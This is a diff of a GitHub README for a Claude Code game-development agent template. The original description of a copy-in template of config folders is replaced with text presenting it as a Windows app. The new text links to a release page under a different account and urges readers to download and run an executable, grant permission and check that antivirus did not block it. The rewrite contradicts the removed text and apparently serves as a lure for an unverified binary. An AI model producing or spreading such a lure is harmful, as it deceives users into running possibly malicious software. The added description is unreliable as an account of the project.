@@ -1,263 +1,207 @@
-# 🎮 Claude Agents GameKit
+# 🤖 claude_agents_gamekit - Build 3D Games With Guided Agents
 
-![GitHub stars](https://img.shields.io/github/stars/YHQ0601/claude_agents_gamekit?style=flat-square)
-![GitHub last commit](https://img.shields.io/github/last-commit/YHQ0601/claude_agents_gamekit?style=flat-square)
-![Platforms](https://img.shields.io/badge/platforms-Unity%20%7C%20Godot%20%7C%20Web%20%7C%20WeChat%20%7C%20Cocos-blue?style=flat-square)
-![Workflow](https://img.shields.io/badge/workflow-Claude%20Code%20Multi--Agent-6f42c1?style=flat-square)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases)
 
-A production-minded Claude Code multi-agent template for 3D game development across Unity, Godot, Web, WeChat Mini Games, and Cocos Creator.
+## 🖥️ What this is
 
-It is built for a specific problem: game work is noisy, engine-heavy, asset-heavy, and easy to derail with long-context chats. GameKit keeps the workflow structured by combining:
+claude_agents_gamekit is a Windows app template for 3D game work. It helps you run a multi-agent workflow for game tasks like content planning, asset checks, QA, and engine handoff.
 
-- a single orchestrating main session
-- narrow subagents with explicit ownership
-- clean separation between human docs and machine-readable state
-- Asset ABI contracts for safe placeholder replacement
-- QA-first verification and script smoke coverage
+Use it when you want a clear path from idea to game build. It is built for work across common game tools like Godot, Unity, WebGL, and WeChat Mini Game targets.
 
-If you want Claude Code to help with real game slices instead of one-off code snippets, this template is the entry point.
+## 📦 What you need
 
-## ✨ What Is This?
+- Windows 10 or Windows 11
+- A modern 64-bit CPU
+- 8 GB RAM or more
+- 2 GB free disk space
+- A stable internet connection for the first download
+- A GPU that supports your game engine target
 
-GameKit is a portable toolkit that drops into an existing game repository without taking over the host project's own folders.
+If you plan to use Godot or Unity with this kit, install the engine you want to use before you start your project.
 
-It gives you:
+## ⬇️ Download and install
 
-- project agents under [`.claude/agents/`](./.claude/agents/)
-- namespaced slash commands under [`.claude/commands/`](./.claude/commands/)
-- hooks in [`.claude/settings.json`](./.claude/settings.json)
-- reusable toolkit logic in [`.claude-gamekit/core/`](./.claude-gamekit/core/)
-- per-project docs and artifacts in [`.claude-gamekit/project/`](./.claude-gamekit/project/)
+1. Open the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases)
+2. Find the latest release
+3. Download the Windows file from that page
+4. If the download comes as a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the main app or launcher file
+7. If Windows asks for permission, choose Yes
 
-## 🚀 Quick Start
+If you do not see the app right away, look for files named `claude_agents_gamekit`, `launcher`, or `setup`.
 
-1. Copy these into your game repository root:
-   - `CLAUDE.md`
-   - `.claude/`
-   - `.claude-gamekit/`
-2. Open Claude Code in that repository.
-3. Check agents:
+## 🎮 First-time setup
 
-   ```powershell
-   claude agents
-   ```
+When you open the app for the first time, follow the on-screen steps:
 
-4. Validate the toolkit:
+1. Choose your game engine target
+2. Pick a project folder on your PC
+3. Set your asset folders
+4. Confirm the default QA checks
+5. Save your settings
 
-   ```powershell
-   npm --prefix .claude-gamekit/core run validate
-   npm --prefix .claude-gamekit/core run test
-   ```
+The app is built to help you keep project files in order. It uses a clear asset path setup, so your images, models, sounds, and builds stay easy to find.
 
-5. Start a slice:
+## 🧩 What the app can help with
 
-   ```text
-   /gamekit-intake Third-person movement with jump and landing checks
-   /gamekit-slice third-person-movement-with-jump-and-landing-checks
-   /gamekit-dispatch active
-   ```
+- Plan game tasks for a small team or solo project
+- Split work into subagents for design, art, QA, and build steps
+- Check assets before they enter the game
+- Keep file names and folders consistent
+- Prepare output for Godot, Unity, WebGL, and WeChat Mini Game
+- Run QA-first checks before a build goes out
 
-## 📚 Categories
+## 🗂️ Project flow
 
-### [01. Orchestration](#01-orchestration)
+A simple way to use this kit:
 
-The coordination layer that keeps the main session in charge.
+1. Start with a game goal
+2. Add the assets you need
+3. Let the workflow sort tasks into steps
+4. Review the output from each step
+5. Run QA checks
+6. Export for the target engine or platform
 
-- [gamekit-main-orchestrator](./.claude/agents/gamekit-main-orchestrator.md)
-- [CLAUDE.md](./CLAUDE.md)
-- [gamekit-intake](./.claude/commands/gamekit-intake.md)
-- [gamekit-dispatch](./.claude/commands/gamekit-dispatch.md)
-- [workflow-rules.md](./.claude-gamekit/project/docs/shared/workflow-rules.md)
+This keeps the process steady and easier to track. It also helps you catch problems before they reach the final build.
 
-### [02. Planning](#02-planning)
+## 🧠 How the multi-agent setup works
 
-The layer that turns a user goal into a bounded feature slice.
+This template uses a set of focused helpers. Each helper handles one type of work.
 
-- [gamekit-feature-analyst](./.claude/agents/gamekit-feature-analyst.md)
-- [game-brief.md](./.claude-gamekit/project/docs/planning/game-brief.md)
-- [planning/features](./.claude-gamekit/project/docs/planning/features/)
-- [task-record schema](./.claude-gamekit/core/schemas/task-record.schema.json)
-- [work-item schema](./.claude-gamekit/core/schemas/work-item-record.schema.json)
+- One helper can draft task plans
+- One helper can review assets
+- One helper can check build rules
+- One helper can watch for QA issues
+- One helper can prepare engine-specific output
 
-### [03. Assets And Asset ABI](#03-assets-and-asset-abi)
+You do not need to manage each step by hand. You set the goal, then the workflow follows the path you choose.
 
-The layer that keeps placeholder speed and swap safety compatible.
+## 🧪 QA-first workflow
 
-- [gamekit-placeholder-artist](./.claude/agents/gamekit-placeholder-artist.md)
-- [gamekit-tech-art-contracts](./.claude/agents/gamekit-tech-art-contracts.md)
-- [asset-catalog.md](./.claude-gamekit/project/docs/art/asset-catalog.md)
-- [replacement-guide.md](./.claude-gamekit/project/docs/art/replacement-guide.md)
-- [asset-contract schema](./.claude-gamekit/core/schemas/asset-contract.schema.json)
+QA comes before release steps in this kit. That means the app checks for common problems early.
 
-### [04. Gameplay And Engine Adapters](#04-gameplay-and-engine-adapters)
+It can help catch:
 
-The implementation layer for host-project code and engine-specific constraints.
+- Missing files
+- Wrong file names
+- Broken asset paths
+- Empty folders
+- Build target mismatch
+- Simple content issues
 
-- [gamekit-gameplay-engineer](./.claude/agents/gamekit-gameplay-engineer.md)
-- [gamekit-unity-integrator](./.claude/agents/gamekit-unity-integrator.md)
-- [gamekit-godot-integrator](./.claude/agents/gamekit-godot-integrator.md)
-- [gamekit-web-integrator](./.claude/agents/gamekit-web-integrator.md)
-- [gamekit-wechat-integrator](./.claude/agents/gamekit-wechat-integrator.md)
-- [gamekit-cocos-integrator](./.claude/agents/gamekit-cocos-integrator.md)
-- [engine-capabilities.md](./.claude-gamekit/project/docs/engineering/engine-capabilities.md)
+This saves time because you find errors before you package the game.
 
-### [05. QA And Validation](#05-qa-and-validation)
+## 🛠️ Asset ABI
 
-The layer that turns "should work" into evidence.
+Asset ABI here means a fixed way to name, place, and pass assets through the workflow. It helps tools and agents understand the same file structure.
 
-- [gamekit-qa-verifier](./.claude/agents/gamekit-qa-verifier.md)
-- [gamekit-script-validator](./.claude/agents/gamekit-script-validator.md)
-- [test-strategy.md](./.claude-gamekit/project/docs/qa/test-strategy.md)
-- [verify-result schema](./.claude-gamekit/core/schemas/verify-result.schema.json)
-- [script-smoke.mjs](./.claude-gamekit/core/tests/script-smoke.mjs)
+In practice, that means:
 
-### [06. Release And Docs](#06-release-and-docs)
+- Images stay in known folders
+- Audio files use the same pattern
+- Models follow the same handoff path
+- Build output keeps a stable layout
 
-The layer that makes the template usable by other Git users.
+This makes it easier to move work from one step to the next without confusion.
 
-- [gamekit-release-manager](./.claude/agents/gamekit-release-manager.md)
-- [gamekit-bilingual-docs](./.claude/agents/gamekit-bilingual-docs.md)
-- [core README](./.claude-gamekit/core/README.md)
-- [core README.zh-CN](./.claude-gamekit/core/README.zh-CN.md)
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
+## 🧭 Supported game targets
 
-## 01. Orchestration
+This template is built for cross-engine work. You can use it with:
 
-GameKit uses a star topology:
+- Godot
+- Unity
+- WebGL
+- WeChat Mini Game
 
-- the main session coordinates
-- subagents report back
-- handoffs are explicit
-- runtime state is written to artifacts
+Each target can use its own export path and file rules. That helps you match the output to the platform you need.
 
-This is the main defense against context drift.
+## 📁 Typical folder layout
 
-## 02. Planning
+A project made with this kit often looks like this:
 
-The planning layer exists to make tasks restartable.
+- `assets/` for art, sound, and models
+- `tasks/` for planning files
+- `qa/` for checks and reports
+- `exports/` for build output
+- `notes/` for design and team notes
+- `engine/` for engine-specific files
 
-Instead of relying on long chats, it writes down:
+Keeping this layout steady makes the project easier to open later.
 
-- task identity
-- feature boundaries
-- dependencies
-- acceptance criteria
-- work-item ownership
+## 🔄 Common daily use
 
-## 03. Assets And Asset ABI
+If you use the app every day, this is a simple routine:
 
-This is one of the core design choices of the project.
+1. Open your project
+2. Add new assets
+3. Run the asset check
+4. Review the task output
+5. Fix any flagged problems
+6. Export to your chosen engine target
 
-Placeholder assets are useful only if they can be replaced safely later. GameKit solves that with Asset ABI contracts so gameplay code depends on stable interfaces instead of temporary mesh names or hierarchy details.
+This keeps the work moving in a clear order.
 
-## 04. Gameplay And Engine Adapters
+## 🧷 File tips
 
-The repository keeps engine differences isolated instead of pretending they do not exist.
+Use short and clear file names.
 
-Unity is the first full adapter. Cocos Creator 3.x now joins as a single engine adapter that covers both 2D and 3D projects, while Godot, Web, and WeChat Mini Game continue to reuse the same workflow contracts with engine-specific integration rules.
+Good examples:
 
-## 05. QA And Validation
+- `player_idle.png`
+- `enemy_walk.fbx`
+- `ui_click.wav`
+- `level1_layout.json`
 
-Validation is part of the workflow, not an afterthought.
+Try to avoid:
 
-GameKit includes:
+- Long names with many symbols
+- Mixed spaces and underscores
+- Duplicate file names in different folders
 
-- QA-first task flow
-- structured verification artifacts
-- engine capability scaffolds
-- smoke tests for executable toolkit scripts
+Clear names make the workflow easier to use.
 
-## 06. Release And Docs
+## 🧰 Troubleshooting
 
-A reusable template should explain itself well.
+If the app does not start:
 
-That is why this repository includes:
+- Check that you downloaded the latest release
+- Make sure you extracted the ZIP file first
+- Run the app from the extracted folder
+- Try again after restarting Windows
+- Check that your antivirus did not block the file
 
-- GitHub-friendly landing docs
-- deeper core documentation
-- bilingual docs
-- a contribution guide
-- a release-focused agent
+If a build target fails:
 
-## 🧠 Why This Design?
+- Confirm you chose the right engine target
+- Check your asset paths
+- Make sure the project folder is not moved
+- Review the QA output for missing files
 
-This repository is shaped around a few practical beliefs:
+If files do not appear in the app:
 
-- game development needs stronger workflow boundaries than ordinary app work
-- weak or low-context models perform better with narrow roles and explicit outputs
-- temporary assets should not leak into permanent gameplay assumptions
-- verification should degrade explicitly, not disappear
-- a template should stay clean instead of shipping preloaded demo runtime state
+- Refresh the folder view
+- Confirm the files are in the expected asset folder
+- Check file names for strange characters
 
-## 🗂 Repository Structure
+## 🔐 Safety and trust
 
-```text
-CLAUDE.md
-.claude/
-.claude-gamekit/
-  core/
-  project/
-```
+The app works from a local project folder on your PC. You control the files and the export path. Keep your project in a folder you can find again, such as `Documents` or `Desktop`, so you can open it fast.
 
-- `CLAUDE.md`: thin entrypoint for Claude Code
-- `.claude/`: agents, commands, settings
-- `.claude-gamekit/core/`: reusable logic, schemas, engines, tests
-- `.claude-gamekit/project/`: project docs and runtime artifacts
+## 📚 Example use case
 
-## ✅ Validation
+You want to build a small 3D game with a character, one level, and a basic menu.
 
-Run from the repository root:
+You can use this kit to:
 
-```powershell
-npm --prefix .claude-gamekit/core run validate
-npm --prefix .claude-gamekit/core run test
-```
+- Organize the model, textures, and sounds
+- Split the work into small steps
+- Check the files before export
+- Prepare the build for Godot or Unity
+- Keep QA in the loop before release
 
-What this covers:
+This helps you avoid a messy folder and keeps the project on track.
 
-- template structure
-- agent and command frontmatter
-- schema fixtures
-- command and hook script smoke execution
-- verification planners for supported engines
+## 🧭 Where to get the download
 
-## 📖 Docs
-
-- [Core README](./.claude-gamekit/core/README.md)
-- [Core README (Chinese)](./.claude-gamekit/core/README.zh-CN.md)
-- [Contributing](./CONTRIBUTING.md)
-- [Workflow Rules](./.claude-gamekit/project/docs/shared/workflow-rules.md)
-
-## 🤝 Contributing
-
-Contributions are welcome, especially around:
-
-- clearer agent and command design
-- stronger schema or smoke coverage
-- broader engine support
-- better documentation
-- safer asset pipeline patterns
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md).
-
-## 🏷 Suggested GitHub About
-
-Description:
-
-`Production-minded Claude Code multi-agent template for 3D game development with orchestrated subagents, Asset ABI, QA-first workflow, and cross-engine adapters.`
-
-Topics:
-
-- `claude-code`
-- `multi-agent`
-- `ai-agents`
-- `game-development`
-- `gamedev`
-- `unity`
-- `godot`
-- `webgl`
-- `wechat-minigame`
-- `cocos-creator`
-- `agentic-workflow`
-- `asset-pipeline`
-- `qa-automation`
+Visit the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases) to download and run this file on Windows.
